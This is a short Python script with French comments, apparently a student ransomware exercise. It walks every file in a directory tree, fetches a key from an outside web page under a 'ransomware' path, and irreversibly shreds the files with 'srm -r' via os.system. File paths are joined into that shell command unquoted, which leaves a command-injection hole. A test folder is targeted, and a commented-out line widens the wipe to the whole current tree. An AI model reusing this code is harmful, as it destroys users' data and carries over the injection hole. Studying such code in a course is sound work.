# -*- coding: utf-8 -*-

from path import Path
import requests
import os

def get_file(dossier='.'):
    #==========================================
    #Cette fonction permet de récupérer le path de 
    # l'ensemble des fichier présent dans le dossier
    # courant et tous les sous-dossiers
    #==========================================
    files = []
    #Parcours les fichiers
    for f in Path(dossier).walkfiles():
        files.append(f)
    return files

def get_key():
    #==========================================
    #Cette fonction permet de récupérer une clef
    # sur une page ESIEE
    #==========================================
    response = requests.get('https://perso.esiee.fr/~guillote/ransomware/')
    #Si la clef a été correctement récupérée
    if (response.status_code == requests.codes.ok):
        #On change le format de la page web pour enlever les ''
        return str(response.content)[1:].replace('\'', '')

def suppression(path):
    #==========================================
    #Cette fonction permet de supprimer de maniere 
    #securisé des fichiers avec la commande srm
    #==========================================
	for files in path:
		os.system("srm -r "+str(files))


def creation():
    #==========================================
    #Cette fonction permet de crée des fichiers
    # qui penvent etre suprimer sans probléme
    # fonction de test
    #==========================================
	os.system("mkdir ./tmpremove 2>/dev/null")
	os.system("echo \"aaaaaaaa\" > ./tmpremove/a ")
	os.system("echo \"bbbbbbbb\" >./tmpremove/b ")
	os.system("echo \"cccccccc\" >./tmpremove/c ")


def main():
	creation()
	
	a=get_file('./tmpremove')
	#a=get_file()
	
	suppression(a)
	

if __name__ == "__main__":
    main()
